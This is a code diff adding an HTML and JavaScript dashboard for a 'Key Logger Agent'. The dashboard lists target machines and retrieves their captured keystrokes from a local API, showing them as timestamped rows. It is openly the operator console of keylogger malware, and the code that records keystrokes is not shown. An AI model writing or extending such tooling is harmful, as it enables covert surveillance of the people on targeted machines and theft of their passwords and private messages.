@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Key Logger Agent</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <h1>Key Logger Agent</h1>
+    <div>
+        <h2>Machines: </h2>
+        <button id="refreshButton">Refresh</button>
+        <ul id="machinesList"></ul>
+    </div>
+    <div>
+        <h2>Get Keystrokes</h2>
+        <form id="keystrokesForm">
+            <label for="targetMachine">Target Machine:</label>
+            <input type="text" id="targetMachine" name="targetMachine" required style="width: 200px;">
+            <button type="submit">Get Keystrokes</button>
+        </form>
+        <pre id="keystrokesOutput"></pre>
+    </div>
+    <script>
+        g = {g: 1};
+        console.log(g.g)
+
+        document.addEventListener('DOMContentLoaded', async () => {
+            const machinesList = document.getElementById('machinesList');
+            machinesList.innerHTML = '';
+            const machines = await getMachinesList();
+            machines.forEach(machine => {
+                const li = document.createElement('li');
+                li.textContent = machine;
+                li.addEventListener('click', () => {
+                    window.open(`machine.html?machine=${machine}`, '_blank');
+                });
+                machinesList.appendChild(li);
+            });
+        });
+
+        document.getElementById('refreshButton').addEventListener('click', async () => {
+            const machinesList = document.getElementById('machinesList');
+            machinesList.innerHTML = '';
+            const machines = await getMachinesList();
+            machines.forEach(machine => {
+                const li = document.createElement('li');
+                li.textContent = machine;
+                machinesList.appendChild(li);
+            });
+        });
+
+        document.getElementById('keystrokesForm').addEventListener('submit', async (event) => {
+        event.preventDefault();
+        const targetMachine = document.getElementById('targetMachine').value;
+        const keystrokesOutput = document.getElementById('keystrokesOutput');
+        keystrokesOutput.innerHTML = 'Loading...';
+        const keystrokes = await getKeystrokes(targetMachine);
+
+        if (keystrokes && keystrokes.length > 0) {
+            const table = document.createElement('table');
+            const headerRow = document.createElement('tr');
+            const timestampHeader = document.createElement('th');
+            timestampHeader.textContent = 'Timestamp';
+            const dataHeader = document.createElement('th');
+            dataHeader.textContent = 'Data';
+            headerRow.appendChild(timestampHeader);
+            headerRow.appendChild(dataHeader);
+            table.appendChild(headerRow);
+
+            keystrokes.forEach(entry => {
+                const row = document.createElement('tr');
+                const timestampCell = document.createElement('td');
+                timestampCell.textContent = entry.timestamp;
+                const dataCell = document.createElement('td');
+                dataCell.textContent = entry.data;
+                row.appendChild(timestampCell);
+                row.appendChild(dataCell);
+                table.appendChild(row);
+            });
+
+            keystrokesOutput.innerHTML = '';
+            keystrokesOutput.appendChild(table);
+        } else {
+            keystrokesOutput.textContent = 'No data available';
+        }
+        });
+
+        async function getMachinesList() {
+            try {
+                const response = await fetch('http://127.0.0.1:5000/api/get_target_machines_list');
+                if (!response.ok) {
+                    throw new Error('Network response was not ok ' + response.statusText);
+                }
+                const data = await response.json();
+                // print the data to the console
+                console.log(data);
+                return data.machines;
+            } catch (error) {
+                console.error('There was a problem with the fetch operation:', error);
+            }
+        }
+
+
+        async function getKeystrokes(targetMachine) {
+            try {
+                const response = await fetch(`http://127.0.0.1:5000/api/get_keystrokes?target_machine=${targetMachine}`);
+                if (!response.ok) {
+                    throw new Error('Network response was not ok ' + response.statusText);
+                }
+                const data = await response.json();
+                return data.data;
+            } catch (error) {
+                console.error('There was a problem with the fetch operation:', error);
+            }
+        }
+    </script>
+    <script src="script.js"></script>
+</body>
+</html>
